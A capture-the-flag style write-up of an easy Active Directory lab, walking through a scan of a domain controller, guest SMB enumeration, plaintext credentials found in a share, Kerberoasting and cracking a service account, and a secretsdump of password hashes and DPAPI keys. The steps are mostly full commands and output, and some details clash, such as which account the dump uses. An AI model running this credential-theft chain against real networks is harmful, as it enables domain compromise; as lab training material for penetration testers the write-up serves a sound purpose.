# Martini AD (Easy)

Author

* Ross

### Objective

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.

#### Reconnaissance

We can use Rust scan to give us a layout of the machine we are targeting.

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# rustscan -b 500 -a 10.1.119.177 --top -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <http://discord.skerritt.blog>         :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.1.119.177:53
Open 10.1.119.177:88
Open 10.1.119.177:135
Open 10.1.119.177:139
Open 10.1.119.177:389
Open 10.1.119.177:445
Open 10.1.119.177:464
Open 10.1.119.177:593
Open 10.1.119.177:636
Open 10.1.119.177:3268
Open 10.1.119.177:3269
Open 10.1.119.177:3389
Open 10.1.119.177:5985
Open 10.1.119.177:9389
Open 10.1.119.177:49667
Open 10.1.119.177:49664
Open 10.1.119.177:49669
Open 10.1.119.177:49677
Open 10.1.119.177:49671
Open 10.1.119.177:49678
Open 10.1.119.177:49697
Open 10.1.119.177:49710
Open 10.1.119.177:62432
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.1.119.177
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( <https://nmap.org> ) at 2026-05-16 12:55 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:55
Completed NSE at 12:55, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:55
Completed Parallel DNS resolution of 1 host. at 12:55, 0.52s elapsed
DNS resolution of 1 IPs took 0.52s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 12:55
Scanning 10.1.119.177 [23 ports]
Discovered open port 445/tcp on 10.1.119.177
Discovered open port 9389/tcp on 10.1.119.177
Discovered open port 53/tcp on 10.1.119.177
Discovered open port 3389/tcp on 10.1.119.177
Discovered open port 139/tcp on 10.1.119.177
Discovered open port 135/tcp on 10.1.119.177
Discovered open port 593/tcp on 10.1.119.177
Discovered open port 49669/tcp on 10.1.119.177
Discovered open port 49710/tcp on 10.1.119.177
Discovered open port 5985/tcp on 10.1.119.177
Discovered open port 49671/tcp on 10.1.119.177
Discovered open port 464/tcp on 10.1.119.177
Discovered open port 49678/tcp on 10.1.119.177
Discovered open port 49677/tcp on 10.1.119.177
Discovered open port 389/tcp on 10.1.119.177
Discovered open port 88/tcp on 10.1.119.177
Discovered open port 3269/tcp on 10.1.119.177
Discovered open port 636/tcp on 10.1.119.177
Discovered open port 49664/tcp on 10.1.119.177
Discovered open port 49697/tcp on 10.1.119.177
Discovered open port 3268/tcp on 10.1.119.177
Discovered open port 62432/tcp on 10.1.119.177
Discovered open port 49667/tcp on 10.1.119.177
Completed SYN Stealth Scan at 12:55, 0.12s elapsed (23 total ports)
Initiating Service scan at 12:55
Scanning 23 services on 10.1.119.177
Completed Service scan at 12:56, 54.44s elapsed (23 services on 1 host)
NSE: Script scanning 10.1.119.177.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:56
NSE Timing: About 99.97% done; ETC: 12:56 (0:00:00 remaining)
Completed NSE at 12:56, 40.14s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:56
Completed NSE at 12:56, 2.67s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Nmap scan report for 10.1.119.177
Host is up, received user-set (0.046s latency).
Scanned at 2026-05-16 12:55:13 EDT for 98s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-16 16:55:19Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: DRY.MARTINI.BARS, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.DRY.MARTINI.BARS
| Issuer: commonName=DC01.DRY.MARTINI.BARS
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-16T01:19:23
| Not valid after:  2026-07-18T01:19:23
| MD5:     e45f 2ccb 66e0 e93a ce42 62b8 4f09 0850
| SHA-1:   2ffc e1c5 3163 c9dd cf69 e82a b091 67a3 1324 0dc7
| SHA-256: 5feb bdd8 fd0f 4eee 431f 0658 cd02 b0aa 582b c3f3 95f9 ad43 ec76 3c28 03dd dfa6
| -----BEGIN CERTIFICATE-----
| MIIC7jCCAdagAwIBAgIQTPVeL4Dy9LpJHK+XV9l0XTANBgkqhkiG9w0BAQsFADAg
| MR4wHAYDVQQDExVEQzAxLkRSWS5NQVJUSU5JLkJBUlMwHhcNMjYwMTE2MDExOTIz
| WhcNMjYwNzE4MDExOTIzWjAgMR4wHAYDVQQDExVEQzAxLkRSWS5NQVJUSU5JLkJB
| UlMwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDJ/g3psOOQlBbVnAig
| rAYTEQ8FxugvGM5s7YHuxmG/gP5Iv8bXE0vUo8XbK5ycmrnRbmFfqMM6VWNHqMHt
| J1hZj8Lrg0++mn+fAO4yoelcTIZqMp+zdXlkKZJZMUjarKz3QJPBMLJPDIbP9FZI
| j9p/UldHNLJ2IUKYk13YRq3tHwiUJcIvZYp7cGGwhCBE1j5jrNYPl2wFEFh8T52k
| zDK3AvqPF8GrMrdeMM8XfbfG4XqFksw6Th0hbLErFlwDu9wqR9gVJNwtR0Ax4UKV
| KGbFxwB/H8EQjTiRIs9V7oRp2Faimv9DhgeNcs1nx2JsJaYR0zIRdpMg+XqvWUlK
| +GMVAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN
| BgkqhkiG9w0BAQsFAAOCAQEAJCrr+jqxs05xpZsTgAAU0PM+kz8a7vfYPxCqGQnJ
| xq88r8WEm9czyGx5YEzF9dRhQdPJvYjXQTsyhqqi/Jo1GklBczktoSSF/BtPGh5f
| abY/WNHhSDxTvdRSXB2VTY1EuU5JOJZZF0gilntX8xw3WnWPlBVKQAIAnFU2Qtsr
| Tgb+xv6Qat3PlC6d3R/zYAGUyRCsHfz95743eZzQhouns47XUevMRAG+2BEDyeDI
| Cpw1SvP5JoRG4uC5vPcbJ1ZOzLTnZN88hdSv4ysqLY8fSZli7deTaGMm7HG6pQKe
| qJJ/d0iwa+CuGAsG4RziqAuWJ1qOdwh3AjaGd1no7kXmxQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: DRY
|   NetBIOS_Domain_Name: DRY
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: DRY.MARTINI.BARS
|   DNS_Computer_Name: DC01.DRY.MARTINI.BARS
|   Product_Version: 10.0.26100
|_  System_Time: 2026-05-16T16:56:08+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49697/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
62432/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <https://nmap.org/cgi-bin/submit.cgi?new-service> :
SF-Port3389-TCP:V=7.99%I=7%D=5/16%Time=6A08A17D%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\\x03\\0\\0\\x13\\x0e\\xd0\\0\\0\\x124\\0\\x02\\?\\x08\\0\\x02\\
SF:0\\0\\0");
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2026-05-16T16:56:08
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21504/tcp): CLEAN (Timeout)
|   Check 2 (port 47291/tcp): CLEAN (Timeout)
|   Check 3 (port 50427/udp): CLEAN (Timeout)
|   Check 4 (port 9853/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:56
Completed NSE at 12:56, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 98.39 seconds
           Raw packets sent: 23 (1.012KB) | Rcvd: 23 (1.012KB)
```

We can check if SMB is vulnerable

nxc smb 10.1.119.177 -u guest -p '' --shares

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc smb  10.1.119.177 -u guest -p '' --shares
SMB         10.1.119.177    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.119.177    445    DC01             [+] DRY.MARTINI.BARS\\guest: 
SMB         10.1.119.177    445    DC01             [*] Enumerated shares
SMB         10.1.119.177    445    DC01             Share           Permissions     Remark
SMB         10.1.119.177    445    DC01             -----           -----------     ------
SMB         10.1.119.177    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.119.177    445    DC01             C$                              Default share
SMB         10.1.119.177    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.119.177    445    DC01             NETLOGON                        Logon server share 
SMB         10.1.119.177    445    DC01             notes           READ,WRITE      
SMB         10.1.119.177    445    DC01             SYSVOL                          Logon server share 
```

We can find that our guest has Shares that we can abuse.

nxc smb 10.1.119.177 -u guest -p '' --rid

```jsx
└─# nnxc smb 10.1.119.177 -u guest -p '' --rid  
SMB         10.1.119.177    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.119.177    445    DC01             [+] DRY.MARTINI.BARS\\guest: 
SMB         10.1.119.177    445    DC01             498: DRY\\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.119.177    445    DC01             500: DRY\\Administrator (SidTypeUser)
SMB         10.1.119.177    445    DC01             501: DRY\\Guest (SidTypeUser)
SMB         10.1.119.177    445    DC01             502: DRY\\krbtgt (SidTypeUser)
SMB         10.1.119.177    445    DC01             512: DRY\\Domain Admins (SidTypeGroup)
SMB         10.1.119.177    445    DC01             513: DRY\\Domain Users (SidTypeGroup)
SMB         10.1.119.177    445    DC01             514: DRY\\Domain Guests (SidTypeGroup)
SMB         10.1.119.177    445    DC01             515: DRY\\Domain Computers (SidTypeGroup)
SMB         10.1.119.177    445    DC01             516: DRY\\Domain Controllers (SidTypeGroup)
SMB         10.1.119.177    445    DC01             517: DRY\\Cert Publishers (SidTypeAlias)
SMB         10.1.119.177    445    DC01             518: DRY\\Schema Admins (SidTypeGroup)
SMB         10.1.119.177    445    DC01             519: DRY\\Enterprise Admins (SidTypeGroup)
SMB         10.1.119.177    445    DC01             520: DRY\\Group Policy Creator Owners (SidTypeGroup)
SMB         10.1.119.177    445    DC01             521: DRY\\Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.119.177    445    DC01             522: DRY\\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.1.119.177    445    DC01             525: DRY\\Protected Users (SidTypeGroup)
SMB         10.1.119.177    445    DC01             526: DRY\\Key Admins (SidTypeGroup)
SMB         10.1.119.177    445    DC01             527: DRY\\Enterprise Key Admins (SidTypeGroup)
SMB         10.1.119.177    445    DC01             528: DRY\\Forest Trust Accounts (SidTypeGroup)
SMB         10.1.119.177    445    DC01             529: DRY\\External Trust Accounts (SidTypeGroup)
SMB         10.1.119.177    445    DC01             553: DRY\\RAS and IAS Servers (SidTypeAlias)
SMB         10.1.119.177    445    DC01             571: DRY\\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.1.119.177    445    DC01             572: DRY\\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.1.119.177    445    DC01             1000: DRY\\DC01$ (SidTypeUser)
SMB         10.1.119.177    445    DC01             1101: DRY\\DnsAdmins (SidTypeAlias)
SMB         10.1.119.177    445    DC01             1102: DRY\\DnsUpdateProxy (SidTypeGroup)
SMB         10.1.119.177    445    DC01             1104: DRY\\mprice (SidTypeUser)
SMB         10.1.119.177    445    DC01             1105: DRY\\athena.t0 (SidTypeUser)
SMB         10.1.119.177    445    DC01             1106: DRY\\ATHENA_SVC (SidTypeUser)
```

```
Administrator
Guest
krbtgt
DC01$
mprice
athena.t0
ATHENA_SVC

```

nxc smb 10.1.16.162 -u guest -p '' --generate-hosts-file hosts

this generates a host file, but we can also add it to our Hosts file

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc smb 10.1.119.177 -u guest -p '' --generate-hosts-file hosts
SMB         10.1.119.177    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.119.177    445    DC01             [+] DRY.MARTINI.BARS\\guest: 
                                                                                   
```

We can use [smbclient.py](http://smbclient.py) with our guest account to look at what is on the SMB shares and lets grab the notes while we are at it to see what it says.

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# smbclient.py guest:''@DC01.DRY.MARTINI.BARS
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

Password:
Type help for list of commands
# more
*** Unknown syntax: more
# ls
[-] No share selected
# shares
ADMIN$
C$
IPC$
NETLOGON
notes
SYSVOL
# 
```

we can read and grab the notes, and it shows us a user and a password to use.

```jsx
# get notes
[-] No share selected
# get notes.txt
[-] No share selected
# use notes
# ls
drw-rw-rw-          0  Sat May 16 13:17:48 2026 .
drw-rw-rw-          0  Sat Jan 17 11:38:33 2026 ..
-rw-rw-rw-        129  Tue Jan 20 13:11:00 2026 notes.txt
# get notes.txt
# exit
                                                                                                                                                                                                                  
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# ls
challenge_lab_martin.ovpn  hosts  MartiniUsers.txt  notes.txt
                                                                                                                                                                                                                  
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# cat notes.txt
- Order more gin for lakeside
- Look for an engagement ring
- Check that notes works from Linux Mint

creds
mprice:*martini*       
```

nxc smb DC01.DRY.MARTINI.BARS -u 'mprice' -p '_martini_' --shares

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc smb DC01.DRY.MARTINI.BARS -u 'mprice' -p '*martini*'  --shares
SMB         10.1.119.177    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.119.177    445    DC01             [+] DRY.MARTINI.BARS\\mprice:*martini* 
SMB         10.1.119.177    445    DC01             [*] Enumerated shares
SMB         10.1.119.177    445    DC01             Share           Permissions     Remark
SMB         10.1.119.177    445    DC01             -----           -----------     ------
SMB         10.1.119.177    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.119.177    445    DC01             C$                              Default share
SMB         10.1.119.177    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.119.177    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.119.177    445    DC01             notes           READ,WRITE      
SMB         10.1.119.177    445    DC01             SYSVOL          READ            Logon server share 
```

We can see our user DOES have Shares to use,

We can try to collect information via bloodhound but it may not work right

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc ldap DC01.DRY.MARTINI.BARS -u 'mprice' -p '*martini*' --bloodhound --collection All --dns-server 10.1.119.177
LDAP        10.1.119.177    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.1.119.177    389    DC01             [+] DRY.MARTINI.BARS\\mprice:*martini* 
LDAP        10.1.119.177    389    DC01             Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP        10.1.119.177    389    DC01             Excluded collection methods: 
LDAP        10.1.119.177    389    DC01             [-] BloodHound collection failed: LDAPSocketOpenError - socket ssl wrapping error: [Errno 104] Connection reset by peer
```

Maybe later I can try sharphound here to see what it says.

## Access as the ATHENA\_SVC account.

We can try to access the service account, to do this we can do kerberoasting to achieve that goal.

nxc ldap DC01.DRY.MARTINI.BARS -u 'mprice' -p '_martini_' --kerberoast kerberoastables.txt

this gives us the ATHENA\_SVC account’s hash:

```jsx
                                                                                                                                                                                                                
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc ldap DC01.DRY.MARTINI.BARS -u 'mprice' -p '*martini*' --kerberoast kerberoastables.txt
LDAP        10.1.119.177    389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.1.119.177    389    DC01             [+] DRY.MARTINI.BARS\\mprice:*martini* 
LDAP        10.1.119.177    389    DC01             [*] Skipping disabled account: krbtgt
LDAP        10.1.119.177    389    DC01             [*] Total of records returned 1
LDAP        10.1.119.177    389    DC01             [*] sAMAccountName: ATHENA_SVC, memberOf: ['CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS', 'CN=Remote Desktop Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS'], pwdLastSet: 2026-01-20 13:20:32.856622, lastLogon: <never>
LDAP        10.1.119.177    389    DC01             $krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\\ATHENA_SVC*$08fdcc83339b4bec2948761b46979dbe$96744b7834dd4454658b91f854d6115a577edba0d39a9435cc0ab284aa72edfc7939aa0cb170db3791b3dd8d5b7252578c56e4a68e3440e99da62472aece72f37dd2b1e4807367297721727d0366995e0493fc8081ad312e0c82da0bebe4d6a81b7755b29d8bf0ef82b929211693098f711206a460fc0eee39a5586f852429f0201c67d354a781bf89860e595740fea763d9e800285a5214915773e3a1b63b899450a06557f2f47d2a6b75aed001ba36e3d5650548649c91ce19ed4a83c569d8cda9719bb7251a8deedbd7e064c406822b41b998b08470b13abcb8daccd940e32868f90f0887e180941c06b319176b321ccfff3d8a8c03fc184cda146071b324006e5261d167aa84c87575930a90c91fc8d32cee14b3519c968ab500b7dc215f0e02dd18dca0026c56f05b5dbe6ac7f39dc800cbfef263df374eb15c755b8a7258bef3d5551ae3576584628f7312912efa753f4756fb6f20a5fda783fe1a7eb261be580897f23d9c2382c1f48d8b3087b7c04628ed7287062100ba5199d3db158375e1bf30e2744af3df7baafb88ecdaad09307810c4097f8689a990314843cdc1fa02961c04bbeeee82c8fdcd2e943ecfe1e073b2b0462e6deab672344664cc5061607988dc259843d649dd5bcf3a1fa0642dbb115793096e719fa5ecc4279cb71169a8728f3b709207de9d4c2e008c13a4c87d4f9051d9bad43f56cc93732c4480a3a137d54ee5a92d7c4fb36c301c51f4c56c2a43319e84be72a7e9739b7f31f4da2b44f404ef950de8d871d17beaeb3ca269e0b95ad266a8a493558752484d957c370c6f5c35dd38e315321c40a75d61416b7031bb7d81e2127dc4a6f1b7451ef458b04e0d6ffbe08b22fb7ed7d4c05d0e6ee85c23e9105e4975bf0f93bf5d8cd634cefb942b8b9729a178269359fdde2ccfc5e1a0a330bbfddacdf29d0e800bdd8e92a9893744ee96d0ac6463a6681cd34ec623762a9403cb6fa42908a1629de5d1cd25b04e2b6752946fc8b3f6728ca8da877ddcc90b11e62b9bce567c624ea890950ea33c98c3dbefc3d3286bb1fd3c82bf9cf1e4e83d75e9f299b6595a5da4a0b7dd93a274d8c6673dbdf000b353227013fdd086841e4f8e935ea9ecd0c82347d096db86d6d7bd3a0effe72a2e852585601248c6a9d18cd5304907f16f78147faf654cc4a149fb1f757a288d85e9fc8427cc6c2a6bf0decd65c46d83ffeabf991bb306d6faeff904d2e0722c7ce55cb35d96f87a3833aaff2ed3aa7d99d6531ce960f68aaf3a52259e39daec6bae6f02d7656109eb60d4a6d5705e6902927b53d488f056a1ebbe67ec10d32f0ad490cb6c994e544750f3037bdc4512def4f0b2e607ae343da2123cb37c32df83cf2af7128c3ae08ac3b7ba7ea8b5ac0fc633d6d648a67f9f315dddc4a1dadb7c5b57c3c25648bae20d57198db7e86b634ce30ae25030a527dafbedb96d1b157b5346eeea0fa1bffbfd75d983230dc407da7507b3ae9f70954d1d7db2c9b6
```

The Hash for her account is here:

```jsx
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS\\ATHENA_SVC*$b22d9234f7bcab83e40599a641fd4c92$0aff430bbd193ed8bc9b2ee6fb54544db27ccd766a08d36684ea040c62e592647af957c5256bed5123c060fa18ed96f53156c3c73578c648699aecb6183eabced8bce8a90a3c1c49863e7e55652b2bc18593e668644a57f01ed090373fb91c0b457b967be3a2b133cf73073e976ad5926457a212e613dab7271ebc02cfcc511feede00bb881744041a983955564e453a5fc39bc4b92f42a9ec2c5f026f04dce111b4a292fffc3771f21121968125ddceb95179bed91eca409019b106e163a14c6a04b3dfe1126f26c2716ab847f59bf0c682995ef1fdef17523cc47932d77aab117fcc366791e645b4e424cc8e33890e7abc49f2f3dcbb5441b2d909ecd068b6d1a7685a2a7c947b5a4235b9a7d3804059be8ee75d0f2b4c1468b372ea84c90685219de02f4e0f31b45429ddd369208843a1d97fc6108c6452590eadc1a5cbcceaaf6c7c73eb52e6d495f2b673dcee87bde7648f1b1ba58abcc229f66a476469cb86a8f2474807df9998ba87b1ddb2d19eae6441e23afe3e1e95b85d846e8f364946ded34bfcabd044a4b3282a6473d688072a2edffb9e607b0f5734e45df7a0b91d5edb756a16de6731da5eba9cdc8a4053085f1d49740cd3e5fd63b361ce7a17eb38e99bb21e721001eec28eff972dd3690214b2a8d2fbde0fb6ad3b6333cf5139f1d721b2d979a42030c118b5f60e1b8674f77aeb5f97cd064dc09022d58564fc8f8ec64e478c6b4fa7385c67513852214ff42fcbad8029dec15635b98d2f276a19014c80145d80ab45d37fe463757a6ec1be72b34820ece224c15bda12c5a6942bfb2ec453464c40e988605d0ef4740886089dad1811efeef26f771aa9910e7dc741613a4864a6d2b11e7e706a68bbabe89639b49db82cd1af44574d46130b932368e88f9079b3d7c0b6945c9d4a7e2865a505c95683bd31d0273178e54a2f8584ab1a38a9d4bc4b3fd1740c74d70dea77b45027b80f4cc9c803e4b42bd0701afcfe3f4722abfeec42ca0303e9bee730bfd7a9b42b661f201a1cfe23fdd580a247a007a358b54d5fa8f9928eed8314ab19d4adb35b13afbbc7c438dcfb2fcdcc18dfbffa8d455d87a917cc71366453982fb03201d0a0307d08ec12f11168216f8b64d6e467a09e99cc655a73b60ede1c5c9052cd8a0e71b8213b041a7ec9ab782790452605b3b8f0c032f5bad66cb03d6b17b07b2f4545e0f76f4bd5402cd4b4b1622acefd8585e232d32a7a9b05ee52e3b379a96323081b578e34c624e7896591f80a0e99a74a3dfa2fb9be69dcf7e21f961a1e5aad8f841f481a078033b9baaba37058a26197ad16974edf798932ceb56502e222d8088cc114d0715d684dd4831101b9733267102354a6be4eb92fd0f774f52d914a4697bc7e96cc399382a3cc9550bca74416f82afe9119051b88617183c1b00d85f8ce60f1395a70fa2104731157c69b85a44d190838cae09ca5755cecc4876f8ef09638cbf0ce4744624b08a8c0e27e1ed740d588574932:1dirtymartini

```

user ATHENA\_SVC:1dirtymartini

We can use NXC again to check if Athena has Shares: `nxc smb DC01.DRY.MARTINI.BARS -u 'ATHENA_SVC' -p 'REDACTED' --shares`

```jsx
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# nxc smb DC01.DRY.MARTINI.BARS -u 'ATHENA_SVC' -p '1dirtymartini' --shares
SMB         10.1.119.177    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.119.177    445    DC01             [+] DRY.MARTINI.BARS\\ATHENA_SVC:1dirtymartini 
SMB         10.1.119.177    445    DC01             [*] Enumerated shares
SMB         10.1.119.177    445    DC01             Share           Permissions     Remark
SMB         10.1.119.177    445    DC01             -----           -----------     ------
SMB         10.1.119.177    445    DC01             ADMIN$                          Remote Admin
SMB         10.1.119.177    445    DC01             C$                              Default share
SMB         10.1.119.177    445    DC01             IPC$            READ            Remote IPC
SMB         10.1.119.177    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.119.177    445    DC01             notes           READ,WRITE      
SMB         10.1.119.177    445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# 
```

Which she does have this. We can grab the KBTGT hash while we are here.

```jsx
                                                                                                                                                                                                                                         
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/MartiniAD]
└─# secretsdump.py 'athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS'                                 
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xb2f01e3e3c1aa452de55002fbe88214a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DRY\\DC01$:aes256-cts-hmac-sha1-96:f822edbd73e4ca15eafc1596466cf15eee5599ee9ce424ac31e6b2c89bb8abbc
DRY\\DC01$:aes128-cts-hmac-sha1-96:d22175300e1511a8aa3ac39273fbe3f7
DRY\\DC01$:des-cbc-md5:610825da923e3e67
DRY\\DC01$:aad3b435b51404eeaad3b435b51404ee:d97154988bebd9703ca12f27b6275c3e:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf2a16bffe9821b781c11e6abc7c86537a314dcbb
dpapi_userkey:0xf6f64677bd9484d59e36c9a2b933b81d16c3f5c9
[*] NL$KM 
 0000   D6 F9 1E BE 20 95 21 6A  88 22 1F 5C 92 CE 2C 8A   .... .!j.".\\..,.
 0010   BB CF 2C 38 59 53 A4 3A  EF A0 03 DA EA A5 A8 CF   ..,8YS.:........
 0020   0E 6F 91 92 02 3E 5B 45  40 E2 C7 A8 D5 DA 8B 11   .o...>[E@.......
 0030   6D 77 6B 5F 3F 78 48 12  0F BF A8 CE 06 C2 C6 7C   mwk_?xH........|
NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
